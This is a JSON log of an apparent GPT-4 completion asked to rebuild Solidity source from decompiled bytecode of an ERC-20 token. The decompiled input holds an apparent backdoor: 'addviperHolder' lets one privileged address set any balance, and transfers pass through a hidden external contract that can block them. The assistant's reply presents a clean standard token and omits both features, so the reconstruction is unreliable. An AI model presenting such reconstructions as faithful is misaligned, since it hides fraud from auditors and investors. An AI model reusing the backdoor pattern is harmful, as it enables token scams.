{
	"address": "0x7cc551b23ded82fa4109c62b6cdc97592539de95",
	"choices": [
		{
			"finish_reason": "stop",
			"index": 0,
			"message": {
				"content": "Here is the Solidity contract code based on the decompiled EVM Bytecode.\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Token {\n    mapping (address => uint256) private _balanceOf;\n    mapping (address => mapping (address => uint256)) private _allowance;\n    uint256 private _totalSupply;\n    address private _owner;\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor (string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = 18;\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balanceOf[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowance[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, msg.sender, _allowance[sender][msg.sender] - amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowance[msg.sender][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowance[msg.sender][spender] - subtractedValue);\n        return true;\n    }\n\n    function transferOwnership(address newOwner) public {\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _owner = newOwner;\n        emit OwnershipTransferred(_owner, newOwner);\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(_balanceOf[sender] >= amount, \"ERC20: transfer amount exceeds balance\");\n\n        _balanceOf[sender] -= amount;\n        _balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n    \n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        \n        _allowance[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n}\n```\n\nPlease note that the original decompiled code can't be fully translated into Solidity as it contains some invalid or deprecated functions, and some functions are unknown or not clear from the decompiled code. However, I have provided a similar solidity code as per the functions found in the decompiled code.",
				"role": "assistant"
			}
		}
	],
	"created": 1701485813,
	"id": "chatcmpl-8RATVwasdfaKqR0p7OrGLcU5yE1rv",
	"input_format": "DecompiledCode",
	"ir": "// Decompiled by library.dedaub.com\n// 2023.11.16 09:12 UTC\n// Compiled using the solidity compiler version 0.8.0\n\n\n// Data structures and variables inferred from the use of storage instructions\nmapping (uint256 => uint256) _balanceOf; // STORAGE[0x0]\nmapping (uint256 => mapping (uint256 => uint256)) _allowance; // STORAGE[0x2]\nuint256 _totalSupply; // STORAGE[0x3]\nuint256[] array_4; // STORAGE[0x4]\nuint256[] array_5; // STORAGE[0x5]\nuint256 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19\nuint256 _addviperHolder; // STORAGE[0x6] bytes 0 to 19\nuint256 _owner; // STORAGE[0x7] bytes 0 to 19\n\n\n// Events\nApproval(address, address, uint256);\nTransfer(address, address, uint256);\nOwnershipTransferred(address, address);\n\nfunction totalSupply() public payable { \n    return _totalSupply;\n}\n\nfunction addviperHolder(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    if (msg.sender != _addviperHolder) {\n        v0 = v1 = 100;\n    } else {\n        v0 = v2 = 10;\n    }\n    require(uint8(10) >= uint8(v0), Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] = varg1;\n}\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public payable { \n    require(msg.data.length - 4 >= 96);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    if (_allowance[varg0][msg.sender] != ~0) {\n        require(_allowance[varg0][msg.sender] >= varg2, Error('ERC20: insufficient allowance'));\n        0x3d6(_allowance[varg0][msg.sender] - varg2, msg.sender, varg0);\n        // Unknown jump to Block 0x2e0. Refer to 3-address code (TAC);\n    }\n    0x4d4(varg2, varg1, varg0);\n    return bool(1);\n}\n\nfunction decimals() public payable { \n    return uint8(18);\n}\n\nfunction balanceOf(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    return _balanceOf[varg0];\n}\n\nfunction renounceOwnership() public payable { \n    0x669();\n    _owner = 0;\n    emit OwnershipTransferred(_owner, address(0x0));\n}\n\nfunction owner() public payable { \n    return _owner;\n}\n\nfunction symbol() public payable { \n    v0 = 0x33d();\n    v1 = 0;\n    v2 = new bytes[](v0.length);\n    while (v1 < v0.length) {\n        v2[v1] = v0[v1];\n        v1 += 32;\n    }\n    if (v1 > v0.length) {\n        v2[v0.length] = v1;\n    }\n    return v2;\n}\n\nfunction transfer(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    0x4d4(varg1, varg0, msg.sender);\n    return bool(1);\n}\n\nfunction allowance(address varg0, address varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    return _allowance[varg0][varg1];\n}\n\nfunction transferOwnership(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    0x669();\n    require(varg0, Error('Ownable: new owner is the zero address'));\n    _owner = varg0;\n    emit OwnershipTransferred(_owner, varg0);\n}\n\nfunction 0x1c5() private { \n    v0 = 0xadb(array_4.length);\n    v1 = new bytes[](v0);\n    v2 = v3 = v1.data;\n    v4 = 0xadb(array_4.length);\n    if (!v4) {\n        return v1;\n    } else if (31 < v4) {\n        v5 = array_4.data;\n        do {\n            MEM[v2] = STORAGE[v5];\n            v5 += 1;\n            v2 += 32;\n        } while (v3 + v4 <= v2);\n        return v1;\n    } else {\n        MEM[v3] = array_4.length >> 8 << 8;\n        return v1;\n    }\n}\n\nfunction 0x33d() private { \n    v0 = 0xadb(array_5.length);\n    v1 = new bytes[](v0);\n    v2 = v3 = v1.data;\n    v4 = 0xadb(array_5.length);\n    if (!v4) {\n        return v1;\n    } else if (31 < v4) {\n        v5 = array_5.data;\n        do {\n            MEM[v2] = STORAGE[v5];\n            v5 += 1;\n            v2 += 32;\n        } while (v3 + v4 <= v2);\n        return v1;\n    } else {\n        MEM[v3] = array_5.length >> 8 << 8;\n        return v1;\n    }\n}\n\nfunction 0x3d6(uint256 varg0, address varg1, address varg2) private { \n    require(varg2, Error('ERC20: approve from the zero address'));\n    require(varg1, Error('ERC20: approve to the zero address'));\n    _allowance[varg2][varg1] = varg0;\n    emit Approval(varg2, varg1, varg0);\n    return ;\n}\n\nfunction 0x4d4(uint256 varg0, address varg1, address varg2) private { \n    require(varg2, Error('ERC20: transfer from the zero address'));\n    v0 = _SafeSub(varg0, varg0);\n    require(100 <= ~v0, Panic(17)); // arithmetic overflow or underflow\n    require(bool(stor_1_0_19.code.size));\n    v1, /* uint256 */ v2 = stor_1_0_19.call(0x194a51d800000000000000000000000000000000000000000000000000000000, varg2, varg1).gas(msg.gas);\n    require(bool(v1), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);\n    v3 = _SafeSub(v2, 100 + v0);\n    require(varg1, Error('ERC20: transfer to the zero address'));\n    require(_balanceOf[varg2] >= varg0, Error('ERC20: transfer amount exceeds balance'));\n    _balanceOf[varg2] = _balanceOf[varg2] - varg0;\n    _balanceOf[varg1] += varg0;\n    emit Transfer(varg2, varg1, varg0);\n    return ;\n}\n\nfunction 0x669() private { \n    require(_owner == msg.sender, Error('Ownable: caller is not the owner'));\n    return ;\n}\n\nfunction _SafeSub(uint256 varg0, uint256 varg1) private { \n    require(varg0 >= varg1, Panic(17)); // arithmetic overflow or underflow\n    return varg0 - varg1;\n}\n\nfunction 0xadb(uint256 varg0) private { \n    v0 = v1 = varg0 >> 1;\n    if (!(varg0 & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require(varg0 & 0x1 != v0 < 32, Panic(34)); // access to incorrectly encoded storage byte array\n    return v0;\n}\n\nfunction () public payable { \n    revert();\n}\n\nfunction name() public payable { \n    v0 = 0x1c5();\n    v1 = 0;\n    v2 = new bytes[](v0.length);\n    while (v1 < v0.length) {\n        v2[v1] = v0[v1];\n        v1 += 32;\n    }\n    if (v1 > v0.length) {\n        v2[v0.length] = v1;\n    }\n    return v2;\n}\n\nfunction approve(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    0x3d6(varg1, varg0, msg.sender);\n    return bool(1);\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(bytes4 function_selector) public payable { \n    MEM[64] = 128;\n    require(!msg.value);\n    if (msg.data.length < 4) {\n        ();\n    } else if (0x70a08231 > function_selector >> 224) {\n        if (0x6fdde03 == function_selector >> 224) {\n            name();\n        } else if (0x95ea7b3 == function_selector >> 224) {\n            approve(address,uint256);\n        } else if (0x18160ddd == function_selector >> 224) {\n            totalSupply();\n        } else if (0x183274e3 == function_selector >> 224) {\n            addviperHolder(address,uint256);\n        } else if (0x23b872dd == function_selector >> 224) {\n            transferFrom(address,address,uint256);\n        } else {\n            require(0x313ce567 == function_selector >> 224);\n            decimals();\n        }\n    } else if (0x70a08231 == function_selector >> 224) {\n        balanceOf(address);\n    } else if (0x715018a6 == function_selector >> 224) {\n        renounceOwnership();\n    } else if (0x8da5cb5b == function_selector >> 224) {\n        owner();\n    } else if (0x95d89b41 == function_selector >> 224) {\n        symbol();\n    } else if (0xa9059cbb == function_selector >> 224) {\n        transfer(address,uint256);\n    } else if (0xdd62ed3e == function_selector >> 224) {\n        allowance(address,address);\n    } else {\n        require(0xf2fde38b == function_selector >> 224);\n        transferOwnership(address);\n    }\n}\n",
	"language": "Solidity",
	"messages": [
		{
			"content": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.",
			"role": "system"
		},
		{
			"content": "The following is the decompiled code: // Decompiled by library.dedaub.com\n// 2023.11.16 09:12 UTC\n// Compiled using the solidity compiler version 0.8.0\n\n\n// Data structures and variables inferred from the use of storage instructions\nmapping (uint256 => uint256) _balanceOf; // STORAGE[0x0]\nmapping (uint256 => mapping (uint256 => uint256)) _allowance; // STORAGE[0x2]\nuint256 _totalSupply; // STORAGE[0x3]\nuint256[] array_4; // STORAGE[0x4]\nuint256[] array_5; // STORAGE[0x5]\nuint256 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19\nuint256 _addviperHolder; // STORAGE[0x6] bytes 0 to 19\nuint256 _owner; // STORAGE[0x7] bytes 0 to 19\n\n\n// Events\nApproval(address, address, uint256);\nTransfer(address, address, uint256);\nOwnershipTransferred(address, address);\n\nfunction totalSupply() public payable { \n    return _totalSupply;\n}\n\nfunction addviperHolder(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    if (msg.sender != _addviperHolder) {\n        v0 = v1 = 100;\n    } else {\n        v0 = v2 = 10;\n    }\n    require(uint8(10) >= uint8(v0), Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] = varg1;\n}\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public payable { \n    require(msg.data.length - 4 >= 96);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    if (_allowance[varg0][msg.sender] != ~0) {\n        require(_allowance[varg0][msg.sender] >= varg2, Error('ERC20: insufficient allowance'));\n        0x3d6(_allowance[varg0][msg.sender] - varg2, msg.sender, varg0);\n        // Unknown jump to Block 0x2e0. Refer to 3-address code (TAC);\n    }\n    0x4d4(varg2, varg1, varg0);\n    return bool(1);\n}\n\nfunction decimals() public payable { \n    return uint8(18);\n}\n\nfunction balanceOf(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    return _balanceOf[varg0];\n}\n\nfunction renounceOwnership() public payable { \n    0x669();\n    _owner = 0;\n    emit OwnershipTransferred(_owner, address(0x0));\n}\n\nfunction owner() public payable { \n    return _owner;\n}\n\nfunction symbol() public payable { \n    v0 = 0x33d();\n    v1 = 0;\n    v2 = new bytes[](v0.length);\n    while (v1 < v0.length) {\n        v2[v1] = v0[v1];\n        v1 += 32;\n    }\n    if (v1 > v0.length) {\n        v2[v0.length] = v1;\n    }\n    return v2;\n}\n\nfunction transfer(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    0x4d4(varg1, varg0, msg.sender);\n    return bool(1);\n}\n\nfunction allowance(address varg0, address varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    return _allowance[varg0][varg1];\n}\n\nfunction transferOwnership(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    0x669();\n    require(varg0, Error('Ownable: new owner is the zero address'));\n    _owner = varg0;\n    emit OwnershipTransferred(_owner, varg0);\n}\n\nfunction 0x1c5() private { \n    v0 = 0xadb(array_4.length);\n    v1 = new bytes[](v0);\n    v2 = v3 = v1.data;\n    v4 = 0xadb(array_4.length);\n    if (!v4) {\n        return v1;\n    } else if (31 < v4) {\n        v5 = array_4.data;\n        do {\n            MEM[v2] = STORAGE[v5];\n            v5 += 1;\n            v2 += 32;\n        } while (v3 + v4 <= v2);\n        return v1;\n    } else {\n        MEM[v3] = array_4.length >> 8 << 8;\n        return v1;\n    }\n}\n\nfunction 0x33d() private { \n    v0 = 0xadb(array_5.length);\n    v1 = new bytes[](v0);\n    v2 = v3 = v1.data;\n    v4 = 0xadb(array_5.length);\n    if (!v4) {\n        return v1;\n    } else if (31 < v4) {\n        v5 = array_5.data;\n        do {\n            MEM[v2] = STORAGE[v5];\n            v5 += 1;\n            v2 += 32;\n        } while (v3 + v4 <= v2);\n        return v1;\n    } else {\n        MEM[v3] = array_5.length >> 8 << 8;\n        return v1;\n    }\n}\n\nfunction 0x3d6(uint256 varg0, address varg1, address varg2) private { \n    require(varg2, Error('ERC20: approve from the zero address'));\n    require(varg1, Error('ERC20: approve to the zero address'));\n    _allowance[varg2][varg1] = varg0;\n    emit Approval(varg2, varg1, varg0);\n    return ;\n}\n\nfunction 0x4d4(uint256 varg0, address varg1, address varg2) private { \n    require(varg2, Error('ERC20: transfer from the zero address'));\n    v0 = _SafeSub(varg0, varg0);\n    require(100 <= ~v0, Panic(17)); // arithmetic overflow or underflow\n    require(bool(stor_1_0_19.code.size));\n    v1, /* uint256 */ v2 = stor_1_0_19.call(0x194a51d800000000000000000000000000000000000000000000000000000000, varg2, varg1).gas(msg.gas);\n    require(bool(v1), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);\n    v3 = _SafeSub(v2, 100 + v0);\n    require(varg1, Error('ERC20: transfer to the zero address'));\n    require(_balanceOf[varg2] >= varg0, Error('ERC20: transfer amount exceeds balance'));\n    _balanceOf[varg2] = _balanceOf[varg2] - varg0;\n    _balanceOf[varg1] += varg0;\n    emit Transfer(varg2, varg1, varg0);\n    return ;\n}\n\nfunction 0x669() private { \n    require(_owner == msg.sender, Error('Ownable: caller is not the owner'));\n    return ;\n}\n\nfunction _SafeSub(uint256 varg0, uint256 varg1) private { \n    require(varg0 >= varg1, Panic(17)); // arithmetic overflow or underflow\n    return varg0 - varg1;\n}\n\nfunction 0xadb(uint256 varg0) private { \n    v0 = v1 = varg0 >> 1;\n    if (!(varg0 & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require(varg0 & 0x1 != v0 < 32, Panic(34)); // access to incorrectly encoded storage byte array\n    return v0;\n}\n\nfunction () public payable { \n    revert();\n}\n\nfunction name() public payable { \n    v0 = 0x1c5();\n    v1 = 0;\n    v2 = new bytes[](v0.length);\n    while (v1 < v0.length) {\n        v2[v1] = v0[v1];\n        v1 += 32;\n    }\n    if (v1 > v0.length) {\n        v2[v0.length] = v1;\n    }\n    return v2;\n}\n\nfunction approve(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    0x3d6(varg1, varg0, msg.sender);\n    return bool(1);\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(bytes4 function_selector) public payable { \n    MEM[64] = 128;\n    require(!msg.value);\n    if (msg.data.length < 4) {\n        ();\n    } else if (0x70a08231 > function_selector >> 224) {\n        if (0x6fdde03 == function_selector >> 224) {\n            name();\n        } else if (0x95ea7b3 == function_selector >> 224) {\n            approve(address,uint256);\n        } else if (0x18160ddd == function_selector >> 224) {\n            totalSupply();\n        } else if (0x183274e3 == function_selector >> 224) {\n            addviperHolder(address,uint256);\n        } else if (0x23b872dd == function_selector >> 224) {\n            transferFrom(address,address,uint256);\n        } else {\n            require(0x313ce567 == function_selector >> 224);\n            decimals();\n        }\n    } else if (0x70a08231 == function_selector >> 224) {\n        balanceOf(address);\n    } else if (0x715018a6 == function_selector >> 224) {\n        renounceOwnership();\n    } else if (0x8da5cb5b == function_selector >> 224) {\n        owner();\n    } else if (0x95d89b41 == function_selector >> 224) {\n        symbol();\n    } else if (0xa9059cbb == function_selector >> 224) {\n        transfer(address,uint256);\n    } else if (0xdd62ed3e == function_selector >> 224) {\n        allowance(address,address);\n    } else {\n        require(0xf2fde38b == function_selector >> 224);\n        transferOwnership(address);\n    }\n}\n.",
			"role": "user"
		}
	],
	"model": "gpt-4-32k",
	"object": "chat.completion",
	"prompts": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.The following is the decompiled code: // Decompiled by library.dedaub.com\n// 2023.11.16 09:12 UTC\n// Compiled using the solidity compiler version 0.8.0\n\n\n// Data structures and variables inferred from the use of storage instructions\nmapping (uint256 => uint256) _balanceOf; // STORAGE[0x0]\nmapping (uint256 => mapping (uint256 => uint256)) _allowance; // STORAGE[0x2]\nuint256 _totalSupply; // STORAGE[0x3]\nuint256[] array_4; // STORAGE[0x4]\nuint256[] array_5; // STORAGE[0x5]\nuint256 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19\nuint256 _addviperHolder; // STORAGE[0x6] bytes 0 to 19\nuint256 _owner; // STORAGE[0x7] bytes 0 to 19\n\n\n// Events\nApproval(address, address, uint256);\nTransfer(address, address, uint256);\nOwnershipTransferred(address, address);\n\nfunction totalSupply() public payable { \n    return _totalSupply;\n}\n\nfunction addviperHolder(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    if (msg.sender != _addviperHolder) {\n        v0 = v1 = 100;\n    } else {\n        v0 = v2 = 10;\n    }\n    require(uint8(10) >= uint8(v0), Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] = varg1;\n}\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public payable { \n    require(msg.data.length - 4 >= 96);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    if (_allowance[varg0][msg.sender] != ~0) {\n        require(_allowance[varg0][msg.sender] >= varg2, Error('ERC20: insufficient allowance'));\n        0x3d6(_allowance[varg0][msg.sender] - varg2, msg.sender, varg0);\n        // Unknown jump to Block 0x2e0. Refer to 3-address code (TAC);\n    }\n    0x4d4(varg2, varg1, varg0);\n    return bool(1);\n}\n\nfunction decimals() public payable { \n    return uint8(18);\n}\n\nfunction balanceOf(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    return _balanceOf[varg0];\n}\n\nfunction renounceOwnership() public payable { \n    0x669();\n    _owner = 0;\n    emit OwnershipTransferred(_owner, address(0x0));\n}\n\nfunction owner() public payable { \n    return _owner;\n}\n\nfunction symbol() public payable { \n    v0 = 0x33d();\n    v1 = 0;\n    v2 = new bytes[](v0.length);\n    while (v1 < v0.length) {\n        v2[v1] = v0[v1];\n        v1 += 32;\n    }\n    if (v1 > v0.length) {\n        v2[v0.length] = v1;\n    }\n    return v2;\n}\n\nfunction transfer(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    0x4d4(varg1, varg0, msg.sender);\n    return bool(1);\n}\n\nfunction allowance(address varg0, address varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    return _allowance[varg0][varg1];\n}\n\nfunction transferOwnership(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    0x669();\n    require(varg0, Error('Ownable: new owner is the zero address'));\n    _owner = varg0;\n    emit OwnershipTransferred(_owner, varg0);\n}\n\nfunction 0x1c5() private { \n    v0 = 0xadb(array_4.length);\n    v1 = new bytes[](v0);\n    v2 = v3 = v1.data;\n    v4 = 0xadb(array_4.length);\n    if (!v4) {\n        return v1;\n    } else if (31 < v4) {\n        v5 = array_4.data;\n        do {\n            MEM[v2] = STORAGE[v5];\n            v5 += 1;\n            v2 += 32;\n        } while (v3 + v4 <= v2);\n        return v1;\n    } else {\n        MEM[v3] = array_4.length >> 8 << 8;\n        return v1;\n    }\n}\n\nfunction 0x33d() private { \n    v0 = 0xadb(array_5.length);\n    v1 = new bytes[](v0);\n    v2 = v3 = v1.data;\n    v4 = 0xadb(array_5.length);\n    if (!v4) {\n        return v1;\n    } else if (31 < v4) {\n        v5 = array_5.data;\n        do {\n            MEM[v2] = STORAGE[v5];\n            v5 += 1;\n            v2 += 32;\n        } while (v3 + v4 <= v2);\n        return v1;\n    } else {\n        MEM[v3] = array_5.length >> 8 << 8;\n        return v1;\n    }\n}\n\nfunction 0x3d6(uint256 varg0, address varg1, address varg2) private { \n    require(varg2, Error('ERC20: approve from the zero address'));\n    require(varg1, Error('ERC20: approve to the zero address'));\n    _allowance[varg2][varg1] = varg0;\n    emit Approval(varg2, varg1, varg0);\n    return ;\n}\n\nfunction 0x4d4(uint256 varg0, address varg1, address varg2) private { \n    require(varg2, Error('ERC20: transfer from the zero address'));\n    v0 = _SafeSub(varg0, varg0);\n    require(100 <= ~v0, Panic(17)); // arithmetic overflow or underflow\n    require(bool(stor_1_0_19.code.size));\n    v1, /* uint256 */ v2 = stor_1_0_19.call(0x194a51d800000000000000000000000000000000000000000000000000000000, varg2, varg1).gas(msg.gas);\n    require(bool(v1), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);\n    v3 = _SafeSub(v2, 100 + v0);\n    require(varg1, Error('ERC20: transfer to the zero address'));\n    require(_balanceOf[varg2] >= varg0, Error('ERC20: transfer amount exceeds balance'));\n    _balanceOf[varg2] = _balanceOf[varg2] - varg0;\n    _balanceOf[varg1] += varg0;\n    emit Transfer(varg2, varg1, varg0);\n    return ;\n}\n\nfunction 0x669() private { \n    require(_owner == msg.sender, Error('Ownable: caller is not the owner'));\n    return ;\n}\n\nfunction _SafeSub(uint256 varg0, uint256 varg1) private { \n    require(varg0 >= varg1, Panic(17)); // arithmetic overflow or underflow\n    return varg0 - varg1;\n}\n\nfunction 0xadb(uint256 varg0) private { \n    v0 = v1 = varg0 >> 1;\n    if (!(varg0 & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require(varg0 & 0x1 != v0 < 32, Panic(34)); // access to incorrectly encoded storage byte array\n    return v0;\n}\n\nfunction () public payable { \n    revert();\n}\n\nfunction name() public payable { \n    v0 = 0x1c5();\n    v1 = 0;\n    v2 = new bytes[](v0.length);\n    while (v1 < v0.length) {\n        v2[v1] = v0[v1];\n        v1 += 32;\n    }\n    if (v1 > v0.length) {\n        v2[v0.length] = v1;\n    }\n    return v2;\n}\n\nfunction approve(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    0x3d6(varg1, varg0, msg.sender);\n    return bool(1);\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(bytes4 function_selector) public payable { \n    MEM[64] = 128;\n    require(!msg.value);\n    if (msg.data.length < 4) {\n        ();\n    } else if (0x70a08231 > function_selector >> 224) {\n        if (0x6fdde03 == function_selector >> 224) {\n            name();\n        } else if (0x95ea7b3 == function_selector >> 224) {\n            approve(address,uint256);\n        } else if (0x18160ddd == function_selector >> 224) {\n            totalSupply();\n        } else if (0x183274e3 == function_selector >> 224) {\n            addviperHolder(address,uint256);\n        } else if (0x23b872dd == function_selector >> 224) {\n            transferFrom(address,address,uint256);\n        } else {\n            require(0x313ce567 == function_selector >> 224);\n            decimals();\n        }\n    } else if (0x70a08231 == function_selector >> 224) {\n        balanceOf(address);\n    } else if (0x715018a6 == function_selector >> 224) {\n        renounceOwnership();\n    } else if (0x8da5cb5b == function_selector >> 224) {\n        owner();\n    } else if (0x95d89b41 == function_selector >> 224) {\n        symbol();\n    } else if (0xa9059cbb == function_selector >> 224) {\n        transfer(address,uint256);\n    } else if (0xdd62ed3e == function_selector >> 224) {\n        allowance(address,address);\n    } else {\n        require(0xf2fde38b == function_selector >> 224);\n        transferOwnership(address);\n    }\n}\n.",
	"status": "1",
	"time_cost": 22.762237787246704,
	"usage": {
		"completion_tokens": 793,
		"prompt_tokens": 2495,
		"total_tokens": 3288
	}
}